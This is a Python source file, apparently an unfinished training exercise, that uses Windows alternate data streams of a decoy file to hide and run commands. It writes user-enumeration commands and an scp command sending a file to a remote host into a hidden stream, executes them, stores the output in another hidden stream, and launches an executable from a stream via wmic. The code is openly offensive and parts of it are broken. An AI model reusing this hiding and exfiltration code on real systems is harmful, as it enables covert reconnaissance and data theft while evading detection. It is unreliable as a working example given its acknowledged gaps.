import os
import subprocess


def run_alternate_data_streams(decoy, remote_host, remote_host_path):
    """
    THIS EXERCISE IS WIP. It's missing intial steps. Do not use.

    Windows supported only. Use `cmd`, not `powershell` to run.

    Obscure files or applications running malicious code into alternate data streams.

    LESSON STEPS
    1. creates 2 files based on the provided decoy file
    2. writes commands into a `command` file
    3. runs the commands line by line from the command file, storing the commands into a `results` file
    4. runs "ads_app.exe" (not sure how/where this exe is meant ot originate from)
    """

    result_file = f"{decoy}:results.txt"
    command_file = f"{decoy}:commands.txt"

    print(result_file)
    print(command_file)

    with open(command_file, "w") as file:
        file.write("net users\n")
        file.write("whoami\n")
        file.write(
            f"scp -o StrictHostKeyChecking=no temp.txt {remote_host}:{remote_host_path}"
        )
        file.close()

    with open(command_file, "r") as c:
        for line in c:
            str(os.system(line + " >> " + result_file))
        c.close()

    exe_file = "ads_app.exe"
    exe_path = os.path.join(os.getcwd(), f"{decoy}:{exe_file}")
    os.system("wmic process call create " + exe_path)


def my_script(decoy):
    """
    THIS EXERCISE IS WIP. It's missing intial steps. Do not use.

    Awi

    1. creates 2 files based on the provided decoy file
    2. run the subprocesses
    3. print the results into the result file
    """
    result_file = f"{decoy}:results.txt"
    command_file = f"{decoy}:commands.txt"

    cmd_get_users = subprocess.run(
        ["net", "users"], capture_output=True, text=True, check=True, shell=True
    )
    cmd_current_user = subprocess.run(
        ["whoami"], capture_output=True, text=True, check=True, shell=True
    )

    with open(result_file, "w") as file:
        file.write(cmd_get_users)
        file.write(cmd_current_user)
